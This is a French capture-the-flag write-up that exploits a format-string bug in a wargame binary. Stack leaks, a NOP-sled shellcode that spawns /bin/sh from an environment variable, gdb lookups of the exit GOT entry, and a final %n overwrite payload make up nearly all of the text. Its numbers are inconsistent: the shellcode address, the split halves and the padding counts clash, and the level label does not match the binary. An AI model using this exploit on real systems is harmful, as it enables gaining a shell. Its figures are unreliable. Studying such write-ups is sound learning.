## LEVEL 04

Au lancement du programme celui-ci attend une entrée, puis la print dans le terminal.

On peut essayer une format string attack.
```
 $ python -c "print 'aaaa ' + '%x ' * 15" > /tmp/payload
 $ cat /tmp/payload - | ./level05
 aaaa 64 f7fcfac0 f7ec3af9 ffffd4ef ffffd4ee 0 ffffffff ffffd574 f7fdb000 61616161 20782520 25207825 78252078 20782520 252078
```
Printf stock alors notre string à la 10ème adresse.

On créé alors notre payload avec notre shellcode dans une variable d'environnement.

 ```
 export PAYLOAD=$(python -c 'print 128*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ```
    
Grace à gdb on peut trouver l'adresse de cette variable d'environnement.

    (gdb) b *main
    (gdb) x/s *((char **)environ + 19)
    0xffffdf6a: "PAYLOAD=", 'A' <repeats 50 times>, "j\vX\231Rh//shh/bin\211\343\061\311̀"

Notre payload se trouve alors à l'adresse 0xffffdf6a.

On va maintenant chercher l'adresse de l'exit dans le GOT pour la rediriger vers notre variable d'environnement.

```
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt

(gdb) x/2i 0x08048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0
   0x8048376 <exit@plt+6>:      push   $0x18
```

Bien, nous avons maintenant l'adresse de l'exit 0x80497e0

On va alors mettre l'adresse de notre variable d'environnement dans l'adresse ci-dessus. Le problème est qu'il faut la mettre en decimal ce qui fait beaucoup de caractères. On va donc diviser notre adresse en deux 0xdf1c(57194) et 0xffff (65535) que l'on met respectivement dans 0x80497e0 et 0x80497e2.
0xffffdf9c

65535- 57244 = 8291

57244 - 8 = 57236

    (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57266x" + "%10$n" + "%8261x" + "%11$n"'; cat) | ./level05

